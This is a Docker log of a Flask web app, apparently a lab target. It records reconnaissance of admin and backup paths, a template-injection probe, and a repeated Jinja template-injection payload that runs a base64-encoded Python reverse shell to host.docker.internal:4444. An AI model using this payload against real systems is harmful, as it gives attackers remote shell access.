@@ -1,0 +1,131 @@
+webapp-1  | 2026-05-12T13:53:19.220306493Z  * Serving Flask app 'app'
+webapp-1  | 2026-05-12T13:53:19.220315410Z  * Debug mode: off
+webapp-1  | 2026-05-12T13:53:19.221473118Z [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+webapp-1  | 2026-05-12T13:53:19.221477660Z  * Running on all addresses (0.0.0.0)
+webapp-1  | 2026-05-12T13:53:19.221478868Z  * Running on http://127.0.0.1:5000
+webapp-1  | 2026-05-12T13:53:19.221479701Z  * Running on http://172.19.0.2:5000
+webapp-1  | 2026-05-12T13:53:19.221480535Z [33mPress CTRL+C to quit[0m
+webapp-1  | 2026-05-12T13:53:50.507507550Z 172.19.0.3 - - [12/May/2026 13:53:50] "GET / HTTP/1.1" 200 -
+webapp-1  | 2026-05-12T13:53:50.522274550Z 172.19.0.3 - - [12/May/2026 13:53:50] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
+webapp-1  | 2026-05-12T13:53:57.000882136Z 172.19.0.3 - - [12/May/2026 13:53:57] "[36mGET /robots.txt HTTP/1.1[0m" 304 -
+webapp-1  | 2026-05-12T13:53:57.012978094Z 172.19.0.3 - - [12/May/2026 13:53:57] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
+webapp-1  | 2026-05-12T13:54:38.186661864Z 172.19.0.3 - - [12/May/2026 13:54:38] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
+webapp-1  | 2026-05-12T13:54:47.846358827Z 172.19.0.3 - - [12/May/2026 13:54:47] "GET / HTTP/1.1" 200 -
+webapp-1  | 2026-05-12T13:54:47.859552577Z 172.19.0.3 - - [12/May/2026 13:54:47] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
+webapp-1  | 2026-05-12T13:55:00.802022041Z 172.19.0.3 - - [12/May/2026 13:55:00] "[36mGET /robots.txt HTTP/1.1[0m" 304 -
+webapp-1  | 2026-05-12T13:55:00.823070125Z 172.19.0.3 - - [12/May/2026 13:55:00] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
+webapp-1  | 2026-05-12T13:55:10.213064963Z 172.19.0.3 - - [12/May/2026 13:55:10] "[32mGET /admin HTTP/1.1[0m" 302 -
+webapp-1  | 2026-05-12T13:55:10.224245796Z 172.19.0.3 - - [12/May/2026 13:55:10] "GET /admin/login HTTP/1.1" 200 -
+webapp-1  | 2026-05-12T13:55:10.241145713Z 172.19.0.3 - - [12/May/2026 13:55:10] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
+webapp-1  | 2026-05-12T13:55:22.856182385Z 172.19.0.3 - - [12/May/2026 13:55:22] "GET /backup.txt HTTP/1.1" 200 -
+webapp-1  | 2026-05-12T13:55:22.871898052Z 172.19.0.3 - - [12/May/2026 13:55:22] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
+webapp-1  | 2026-05-12T13:55:32.500076223Z 172.19.0.3 - - [12/May/2026 13:55:32] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
+webapp-1  | 2026-05-12T13:55:32.515104223Z 172.19.0.3 - - [12/May/2026 13:55:32] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
+webapp-1  | 2026-05-12T13:55:33.602972807Z 172.19.0.3 - - [12/May/2026 13:55:33] "[32mPOST /admin/login HTTP/1.1[0m" 302 -
+webapp-1  | 2026-05-12T13:55:33.607967390Z 172.19.0.3 - - [12/May/2026 13:55:33] "GET /admin/dashboard HTTP/1.1" 200 -
+webapp-1  | 2026-05-12T13:55:33.623664057Z 172.19.0.3 - - [12/May/2026 13:55:33] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
+webapp-1  | 2026-05-12T13:55:41.330109144Z 172.19.0.3 - - [12/May/2026 13:55:41] "GET /admin/diagnostico HTTP/1.1" 200 -
+webapp-1  | 2026-05-12T13:55:41.349148269Z 172.19.0.3 - - [12/May/2026 13:55:41] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
+webapp-1  | 2026-05-12T13:55:47.621796814Z 172.19.0.3 - - [12/May/2026 13:55:47] "GET /admin/diagnostico?host={{7*7}} HTTP/1.1" 200 -
+webapp-1  | 2026-05-12T13:55:47.638165605Z 172.19.0.3 - - [12/May/2026 13:55:47] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
+webapp-1  | 2026-05-12T13:56:30.446030209Z Traceback (most recent call last):
+webapp-1  | 2026-05-12T13:56:30.446053792Z   File "<stdin>", line 1, in <module>
+webapp-1  | 2026-05-12T13:56:30.446347084Z ConnectionRefusedError: [Errno 111] Connection refused
+webapp-1  | 2026-05-12T13:56:30.463505542Z Traceback (most recent call last):
+webapp-1  | 2026-05-12T13:56:30.463525251Z   File "<stdin>", line 1, in <module>
+webapp-1  | 2026-05-12T13:56:30.463527084Z ConnectionRefusedError: [Errno 111] Connection refused
+webapp-1  | 2026-05-12T13:56:30.479011251Z Traceback (most recent call last):
+webapp-1  | 2026-05-12T13:56:30.479027917Z   File "<stdin>", line 1, in <module>
+webapp-1  | 2026-05-12T13:56:30.479029834Z ConnectionRefusedError: [Errno 111] Connection refused
+webapp-1  | 2026-05-12T13:56:30.482100334Z 172.19.0.3 - - [12/May/2026 13:56:30] "GET /admin/diagnostico?host={{+config.__class__.__init__.__globals__['os'].popen('echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+|+base64+-d+|+python3').read()+}} HTTP/1.1" 200 -
+webapp-1  | 2026-05-12T13:56:30.503679917Z 172.19.0.3 - - [12/May/2026 13:56:30] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
+webapp-1  | 2026-05-12T13:56:49.653379302Z Traceback (most recent call last):
+webapp-1  | 2026-05-12T13:56:49.653415010Z   File "<stdin>", line 1, in <module>
+webapp-1  | 2026-05-12T13:56:49.653417927Z ConnectionRefusedError: [Errno 111] Connection refused
+webapp-1  | 2026-05-12T13:56:49.666703927Z Traceback (most recent call last):
+webapp-1  | 2026-05-12T13:56:49.666723885Z   File "<stdin>", line 1, in <module>
+webapp-1  | 2026-05-12T13:56:49.666725552Z ConnectionRefusedError: [Errno 111] Connection refused
+webapp-1  | 2026-05-12T13:56:49.679402010Z Traceback (most recent call last):
+webapp-1  | 2026-05-12T13:56:49.679420718Z   File "<stdin>", line 1, in <module>
+webapp-1  | 2026-05-12T13:56:49.679422760Z ConnectionRefusedError: [Errno 111] Connection refused
+webapp-1  | 2026-05-12T13:56:49.682445052Z 172.19.0.3 - - [12/May/2026 13:56:49] "GET /admin/diagnostico?host={{+config.__class__.__init__.__globals__['os'].popen('echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+|+base64+-d+|+python3').read()+}} HTTP/1.1" 200 -
+webapp-1  | 2026-05-12T13:56:49.701576427Z 172.19.0.3 - - [12/May/2026 13:56:49] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
+webapp-1  | 2026-05-12T13:56:53.279647637Z Traceback (most recent call last):
+webapp-1  | 2026-05-12T13:56:53.279671428Z   File "<stdin>", line 1, in <module>
+webapp-1  | 2026-05-12T13:56:53.279674012Z ConnectionRefusedError: [Errno 111] Connection refused
+webapp-1  | 2026-05-12T13:56:53.295312345Z Traceback (most recent call last):
+webapp-1  | 2026-05-12T13:56:53.295335678Z   File "<stdin>", line 1, in <module>
+webapp-1  | 2026-05-12T13:56:53.295337678Z ConnectionRefusedError: [Errno 111] Connection refused
+webapp-1  | 2026-05-12T13:56:53.311938262Z Traceback (most recent call last):
+webapp-1  | 2026-05-12T13:56:53.311956928Z   File "<stdin>", line 1, in <module>
+webapp-1  | 2026-05-12T13:56:53.311958762Z ConnectionRefusedError: [Errno 111] Connection refused
+webapp-1  | 2026-05-12T13:56:53.315339428Z 172.19.0.3 - - [12/May/2026 13:56:53] "GET /admin/diagnostico?host={{+config.__class__.__init__.__globals__['os'].popen('echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+|+base64+-d+|+python3').read()+}} HTTP/1.1" 200 -
+webapp-1  | 2026-05-12T13:56:53.330327720Z 172.19.0.3 - - [12/May/2026 13:56:53] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
+webapp-1  | 2026-05-12T13:56:54.198297970Z Traceback (most recent call last):
+webapp-1  | 2026-05-12T13:56:54.198318804Z   File "<stdin>", line 1, in <module>
+webapp-1  | 2026-05-12T13:56:54.198320762Z ConnectionRefusedError: [Errno 111] Connection refused
+webapp-1  | 2026-05-12T13:56:54.214507304Z Traceback (most recent call last):
+webapp-1  | 2026-05-12T13:56:54.214566095Z   File "<stdin>", line 1, in <module>
+webapp-1  | 2026-05-12T13:56:54.214580095Z ConnectionRefusedError: [Errno 111] Connection refused
+webapp-1  | 2026-05-12T13:56:54.229419095Z Traceback (most recent call last):
+webapp-1  | 2026-05-12T13:56:54.229435345Z   File "<stdin>", line 1, in <module>
+webapp-1  | 2026-05-12T13:56:54.229437054Z ConnectionRefusedError: [Errno 111] Connection refused
+webapp-1  | 2026-05-12T13:56:54.232199429Z 172.19.0.3 - - [12/May/2026 13:56:54] "GET /admin/diagnostico?host={{+config.__class__.__init__.__globals__['os'].popen('echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+|+base64+-d+|+python3').read()+}} HTTP/1.1" 200 -
+webapp-1  | 2026-05-12T13:56:54.247710887Z 172.19.0.3 - - [12/May/2026 13:56:54] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
+webapp-1  | 2026-05-12T13:56:54.798861012Z Traceback (most recent call last):
+webapp-1  | 2026-05-12T13:56:54.798881887Z   File "<stdin>", line 1, in <module>
+webapp-1  | 2026-05-12T13:56:54.798883679Z ConnectionRefusedError: [Errno 111] Connection refused
+webapp-1  | 2026-05-12T13:56:54.815572554Z Traceback (most recent call last):
+webapp-1  | 2026-05-12T13:56:54.815590679Z   File "<stdin>", line 1, in <module>
+webapp-1  | 2026-05-12T13:56:54.815592471Z ConnectionRefusedError: [Errno 111] Connection refused
+webapp-1  | 2026-05-12T13:56:54.826933137Z Traceback (most recent call last):
+webapp-1  | 2026-05-12T13:56:54.826950721Z   File "<stdin>", line 1, in <module>
+webapp-1  | 2026-05-12T13:56:54.826952637Z ConnectionRefusedError: [Errno 111] Connection refused
+webapp-1  | 2026-05-12T13:56:54.829219762Z 172.19.0.3 - - [12/May/2026 13:56:54] "GET /admin/diagnostico?host={{+config.__class__.__init__.__globals__['os'].popen('echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+|+base64+-d+|+python3').read()+}} HTTP/1.1" 200 -
+webapp-1  | 2026-05-12T13:56:54.841630971Z 172.19.0.3 - - [12/May/2026 13:56:54] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
+webapp-1  | 2026-05-12T13:56:55.487434596Z Traceback (most recent call last):
+webapp-1  | 2026-05-12T13:56:55.487454513Z   File "<stdin>", line 1, in <module>
+webapp-1  | 2026-05-12T13:56:55.487457179Z ConnectionRefusedError: [Errno 111] Connection refused
+webapp-1  | 2026-05-12T13:56:55.505626763Z Traceback (most recent call last):
+webapp-1  | 2026-05-12T13:56:55.505646513Z   File "<stdin>", line 1, in <module>
+webapp-1  | 2026-05-12T13:56:55.505648429Z ConnectionRefusedError: [Errno 111] Connection refused
+webapp-1  | 2026-05-12T13:56:55.524917763Z Traceback (most recent call last):
+webapp-1  | 2026-05-12T13:56:55.524934096Z   File "<stdin>", line 1, in <module>
+webapp-1  | 2026-05-12T13:56:55.524935638Z ConnectionRefusedError: [Errno 111] Connection refused
+webapp-1  | 2026-05-12T13:56:55.527604679Z 172.19.0.3 - - [12/May/2026 13:56:55] "GET /admin/diagnostico?host={{+config.__class__.__init__.__globals__['os'].popen('echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+|+base64+-d+|+python3').read()+}} HTTP/1.1" 200 -
+webapp-1  | 2026-05-12T13:56:55.547087096Z 172.19.0.3 - - [12/May/2026 13:56:55] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
+webapp-1  | 2026-05-12T14:02:25.758813170Z 172.19.0.3 - - [12/May/2026 14:02:25] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
+webapp-1  | 2026-05-12T14:33:34.887354353Z 172.19.0.3 - - [12/May/2026 14:33:34] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
+webapp-1  | 2026-05-12T14:34:13.971154788Z Traceback (most recent call last):
+webapp-1  | 2026-05-12T14:34:13.971182413Z   File "<stdin>", line 1, in <module>
+webapp-1  | 2026-05-12T14:34:13.971184913Z ConnectionRefusedError: [Errno 111] Connection refused
+webapp-1  | 2026-05-12T14:34:13.997170122Z Traceback (most recent call last):
+webapp-1  | 2026-05-12T14:34:13.997217247Z   File "<stdin>", line 1, in <module>
+webapp-1  | 2026-05-12T14:34:13.997220247Z ConnectionRefusedError: [Errno 111] Connection refused
+webapp-1  | 2026-05-12T14:34:14.001870872Z 172.19.0.3 - - [12/May/2026 14:34:14] "GET /admin/diagnostico?host={{+config.__class__.__init__.__globals__['os'].popen('echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+|+base64+-d+|+python3').read()+}} HTTP/1.1" 200 -
+webapp-1  | 2026-05-12T14:34:35.698982507Z 172.19.0.3 - - [12/May/2026 14:34:35] "GET /admin/diagnostico HTTP/1.1" 200 -
+webapp-1  | 2026-05-12T14:34:35.718793840Z 172.19.0.3 - - [12/May/2026 14:34:35] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
+webapp-1  | 2026-05-12T14:35:43.751151748Z 172.19.0.3 - - [12/May/2026 14:35:43] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
+webapp-1  | 2026-05-12T14:38:28.625815077Z 172.19.0.3 - - [12/May/2026 14:38:28] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
+webapp-1  | 2026-05-12T14:38:46.440272960Z Traceback (most recent call last):
+webapp-1  | 2026-05-12T14:38:46.440303252Z   File "<stdin>", line 1, in <module>
+webapp-1  | 2026-05-12T14:38:46.440326085Z ConnectionRefusedError: [Errno 111] Connection refused
+webapp-1  | 2026-05-12T14:38:46.457922043Z Traceback (most recent call last):
+webapp-1  | 2026-05-12T14:38:46.457946585Z   File "<stdin>", line 1, in <module>
+webapp-1  | 2026-05-12T14:38:46.457948585Z ConnectionRefusedError: [Errno 111] Connection refused
+webapp-1  | 2026-05-12T14:38:46.471143293Z Traceback (most recent call last):
+webapp-1  | 2026-05-12T14:38:46.471158918Z   File "<stdin>", line 1, in <module>
+webapp-1  | 2026-05-12T14:38:46.471160543Z ConnectionRefusedError: [Errno 111] Connection refused
+webapp-1  | 2026-05-12T14:38:46.473843877Z 172.19.0.3 - - [12/May/2026 14:38:46] "GET /admin/diagnostico?host={{+config.__class__.__init__.__globals__['os'].popen('echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+|+base64+-d+|+python3').read()+}} HTTP/1.1" 200 -
+webapp-1  | 2026-05-12T14:38:46.493955210Z 172.19.0.3 - - [12/May/2026 14:38:46] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
+webapp-1  | 2026-05-12T14:39:48.620437115Z Traceback (most recent call last):
+webapp-1  | 2026-05-12T14:39:48.620506031Z   File "<stdin>", line 1, in <module>
+webapp-1  | 2026-05-12T14:39:48.620510115Z ConnectionRefusedError: [Errno 111] Connection refused
+webapp-1  | 2026-05-12T14:39:48.636142781Z Traceback (most recent call last):
+webapp-1  | 2026-05-12T14:39:48.636160156Z   File "<stdin>", line 1, in <module>
+webapp-1  | 2026-05-12T14:39:48.636162323Z ConnectionRefusedError: [Errno 111] Connection refused
+webapp-1  | 2026-05-12T14:39:48.651761406Z Traceback (most recent call last):
+webapp-1  | 2026-05-12T14:39:48.651811740Z   File "<stdin>", line 1, in <module>
+webapp-1  | 2026-05-12T14:39:48.651814531Z ConnectionRefusedError: [Errno 111] Connection refused
+webapp-1  | 2026-05-12T14:39:48.654933573Z 172.19.0.3 - - [12/May/2026 14:39:48] "GET /admin/diagnostico?host={{+config.__class__.__init__.__globals__['os'].popen('echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+|+base64+-d+|+python3').read()+}} HTTP/1.1" 200 -
+webapp-1  | 2026-05-12T14:39:48.670257115Z 172.19.0.3 - - [12/May/2026 14:39:48] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
